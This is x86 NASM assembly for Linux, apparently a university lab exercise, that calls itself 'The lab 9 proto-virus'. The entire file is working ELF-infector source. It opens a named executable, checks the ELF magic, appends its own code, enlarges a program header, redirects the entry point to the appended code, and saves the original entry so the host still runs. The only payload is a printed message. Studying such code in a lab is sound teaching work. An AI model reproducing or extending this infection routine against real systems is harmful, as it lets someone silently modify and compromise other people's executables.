%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_CUR 1
%define SEEK_SET 0
%define stdout 1

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define	ELFHDR_size	52
;%define	load_address	0x08048000

%define EI_MAG0		0		; File identification byte 0 index 
%define ELFMAG0		0x7f		; Magic number byte 0 

%define EI_MAG1		1		; File identification byte 1 index 
%define ELFMAG1		'E'		; Magic number byte 1 

%define EI_MAG2		2		; File identification byte 2 index 
%define ELFMAG2		'L'		; Magic number byte 2 

%define EI_MAG3		3		; File identification byte 3 index 
%define ELFMAG3		'F'		; Magic number byte 3 
	
	global _start

	section .text
_start:     	    
            push    ebp
            mov     ebp, esp
            sub     esp, STK_RES                    ; Set up ebp and reserve space on the stack for local storage
            call    get_my_loc                      ; find OutStr address in run time, ecx <-- next_i
            mov     edx, next_i                     ;......... edx <-- next_i
            sub     edx, OutStr                     ;......... edx <-- next_i - OutStr
            sub     ecx, edx                        ;......... ecx <-- next_i - (next_i - OutStr)
            write   stdout, ecx, 31                 ; print OutStr
            open    FileName, RDWR, 0
            mov     [ebp-4], eax                    ; [ebp-4] <-- fd
            cmp     dword [ebp-4], -1
            jle     CouldNotOpenFile
            mov     ebx, ebp
            sub     ebx, 8                          ; ebx = ebp-8
            read    [ebp-4], ebx, 4                 ; [ebp-8] =? "\0ELF"
            cmp     byte [ebp-8+EI_MAG0], ELFMAG0
            jne     VirusExitAbNoramlly
            cmp     byte [ebp-8+EI_MAG1], ELFMAG1
            jne     VirusExitAbNoramlly
            cmp     byte [ebp-8+EI_MAG2], ELFMAG2
            jne     VirusExitAbNoramlly
            cmp     byte [ebp-8+EI_MAG3], ELFMAG3
            jne     VirusExitAbNoramlly
            lseek   [ebp-4], 0, SEEK_END
            mov     [ebp-8], eax                    ; [ebp-8] <-- file original size
            write   [ebp-4], _start, virus_end-_start       ; add _Start to the end of ELFexec
            lseek   [ebp-4], 0, SEEK_SET            ; bring file location back to beginning of file
            mov     ebx, ebp
            sub     ebx, 8                          ;
            sub     ebx, ELFHDR_size                ; ebx = ebp-8-52
            read    [ebp-4], ebx, ELFHDR_size       ; [ebp-60]-[ebp-8] <-- ELF header
            mov     eax, [ebp-60+ENTRY]             ; [ebp-64] <-- Previous Entry Point
            mov     [ebp-64], eax                   ;........../
            
            mov     eax, [ebp-60+PHDR_start]        ; eax <-- Start of program headers
            lseek   [ebp-4], eax, SEEK_SET          ; bring file location to phdr
            mov     ebx, ebp
            sub     ebx, 64                         ;
            sub     ebx, PHDR_size                  ; ebx = ebp-64-32
            read    [ebp-4], ebx, PHDR_size         ; [ebp-96]-[ebp-64] <-- first Program header
            mov     ebx, [ebp-96+PHDR_vaddr]        ; ebx <-- PHDR_vaddr
            mov     [ebp-100], ebx                  ; [ebp-100] <-- PHDR_vaddr
            

            
            mov     ebx, ebp
            sub     ebx, 100                        ;
            sub     ebx, PHDR_size                  ; ebx = ebp-100-32
            read    [ebp-4], ebx, PHDR_size         ; [ebp-132]-[ebp-100] <-- second Program header
            mov     ebx, [ebp-132+PHDR_offset]      ; ebx <-- second PHDR_offset
            mov     ecx, virus_end-_start           ; ecx <-- virus code size
            add     ecx, [ebp-8]                        ; ecx <-- virus code size + infected file size
            add     dword [ebp-132+PHDR_filesize], ecx    ; PHDR_filesize <-- virus code size + infected file size
            add     dword [ebp-132+PHDR_memsize], ecx     ; PHDR_memsize <-- virus code size + infected file size
            lseek   [ebp-4], -32, SEEK_CUR          ; bring file location to beginning of second phdr
            mov     ebx, ebp
            sub     ebx, 100                        ;
            sub     ebx, PHDR_size                  ; ebx = ebp-100-32
            write   [ebp-4], ebx, PHDR_size         ; replace second program header with the modified second program header

           
            ;mov     eax, [ebp-8]                    ; eax <-- file original size
            ;add     eax, [ebp-100]                  ; eax <-- file original size + load_address
            
            mov     eax, [ebp-132+PHDR_vaddr]       ; eax <-- second PHDR_vaddr
            add     eax, [ebp-8]                    ; eax <-- second PHDR_vaddr + infected file size
            sub     eax, [ebp-132+PHDR_offset]      ; eax <-- second PHDR_vaddr + infected file size - second PHDR_offset
            mov     [ebp-60+ENTRY], eax             ; ehdr.entry <-- second PHDR_vaddr + second PHDR_filesize - second PHDR_offset
            lseek   [ebp-4], 0, SEEK_SET            ; bring file location back to beginning of file
            mov     ebx, ebp
            sub     ebx, 60
            write   [ebp-4], ebx, ELFHDR_size       ; replace ELF header with the modified ELF header
            lseek   [ebp-4], -4, SEEK_END           ; move to the last 4 bytes
            mov     ebx, ebp
            sub     ebx, 64
            write   [ebp-4], ebx, 4                 ; change the last 4 bytes to be the Previous Entry Point
            close   [ebp-4]
            
CouldNotOpenFile:
            call    get_my_loc                      ; find OutStr address in run time, ecx <-- next_i
            mov     edx, next_i                     ;......... edx <-- next_i
            sub     edx, PreviousEntryPoint         ;......... edx <-- next_i - PreviousEntryPoint
            sub     ecx, edx                        ;......... ecx <-- next_i - (next_i - PreviousEntryPoint)
            jmp     [ecx]
            

VirusExitNoramlly:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         
VirusExitAbNoramlly:
       exit 1            ; exit if error occured
       
FileName:	db "ELFexec2long", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0

get_my_loc:
        call next_i
next_i:
        pop ecx
        ret

PreviousEntryPoint: dd VirusExitNoramlly
virus_end: 


